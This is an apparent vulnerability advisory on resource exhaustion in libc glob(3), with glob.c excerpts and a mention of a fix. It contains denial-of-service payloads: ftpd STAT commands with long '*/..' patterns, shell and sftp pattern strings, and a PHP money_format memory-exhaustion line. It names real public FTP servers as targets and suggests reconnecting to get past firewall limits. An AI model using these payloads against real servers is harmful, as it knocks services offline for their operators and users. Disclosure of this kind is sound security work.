#include <glob.h>
 
int glob(const char *pattern, int flags,
int (*errfunc)(const char *epath, int eerrno), glob_t *pglob);
 
Description
 
This function expands a filename wildcard which is passed as pattern.
 
GLOB_LIMIT Limit the amount of memory used by matches to
ARG_MAX.
This option should be set for programs that can be
coerced to a denial of service attack via patterns
that
expand to a very large number of matches, such as a
long
string of */../*/..
 
 
- --- 1. Multiple Vendors libc/glob(3) resource exhaustion ---
As we can read in definition GLOB_LIMIT:
 
- --
Limit the amount of memory used by matches to ARG_MAX. This option should
be set for programs that can be coerced to a denial of service attack via
patterns that expand to a very large number of mat
ches, such as a long string of */../*/..
- ---
 
but now is comming question "what will happen when we use */.. without
matching any results (simple searching)?" GLOB_LIMIT will be not
overflowed. To realize it, we need only use pattern with many
*/.. and many inodes in current directory. On the end of pattern, we need
add some not existed filename (like /cxib*).
If we don&#039;t have many files or directories in attacked direcotry, we need
create some dir-structure.
 
Let&#039;s see again:
http://cvsweb.netbsd.org/bsdweb.cgi/src/libexec/ftpd/ftpd.c?rev=1.61.2.5&co
ntent-type=text/x-cvsweb-markup
 
GLOB_LIMIT
 
protect us before attacks like
 
*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*
 
because glob will find more patches as in GLOB_LIMIT declared. Anyway, if
we use path what do not exists (with */.. strings) like
 
*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*blablahaha
 
GLOB_LIMIT will be never overflowed. Many combinations of paths, will
execute this proces a long time. We can also try allocate
(GLOB_LIMIT-1)*MAXPATHNAMELEN bytes per one process. ~200~300MB
 
Example:
> telnet ftp.netbsd.org 21
Trying 204.152.190.15...

Escape character is &#039;^]&#039;.

this request will generate 100% usage of process a long time. ftpd come
into glob(3) and will not fast out. Very similar sympthon was described in
vulnerability for glibc strfmon(3)
 
- - http://securityreason.com/achievement_securityalert/67 --
...
Interesting is that the PHP memory_limit has no control over what will
happens in the level of the libc. Function strfmon(3) can allocate a lot
of
data in memory without control by PHP memory_limit.
 
For example:
php -r &#039;money_format("%.1343741821i",1);&#039;
 
will allocate ~1049MB real memory.
memory_limit can be less that 1049M
...
- - http://securityreason.com/achievement_securityalert/67 --
 
ftpd also dosen&#039;t control what will happen in libc.
 
so it is enough to send
- ---
USER anonymous
PASS
STAT */..[calculated pattern]
- ---
 
and disconnect to connect again (bypass firewall limits). In php we can
also bypass max_memory_limit by libc vulns.
 
Attacking machine in this way, we can call the various side effects.

Presented issue in localized libc, not in ftpd. Try use
{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}
/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*cx
 
in ksh, openssh (sftp-server). sftp is also vulnerable. but they will kill
children process after disconnect.
 
"What is wrong?",
 
libc has no control over the computing power glob(3), good fix for this
issue, should control, how many times glob(3) will call to
*readdirfunc(),stat(2) and reducing memory usage.
 
- -glob.c---
...
static int
glob3(Char *pathbuf, Char *pathend, Char *pathlim, Char *pattern,
Char *restpattern, glob_t *pglob, size_t *limit)
{
struct dirent *dp;

int error;
char buf[MAXPATHLEN];
 
/*
* The readdirfunc declaration can&#039;t be prototyped, because it is
* assigned, below, to two functions which are prototyped in

* structures.
*/
struct dirent *(*readdirfunc)(void *);
...
/*

* segment with meta character found.
*/
for (anymeta = 0;;) {
if (*pattern == EOS) { /* End of pattern? */
*pathend = EOS;

if (pglob->gl_flags & GLOB_ALTDIRFUNC)
readdirfunc = pglob->gl_readdir;
else
readdirfunc = (struct dirent *(*)__P((void *))) readdir;
while ((dp = (*readdirfunc)(dirp)) != NULL) { <============= LIMIT

...
- -glob.c---
 
As we can see, glob3() will call to (*readdirfunc)() and back to glob2().
glob2() will come again in glob3()... we need try control, how many times
glob will call to (*readdirfunc)() and stat().
Fix created together with NetBSD devs, should fix this problem.
 
 
- --- 2. 0day PoC ---
To sucessfully attack, we need calculate pattern. I am not going show, how
to optimal calulate pattern.
With similar PoC we can try attack ftp.adobe.com, ftp.openbsd.org etc.
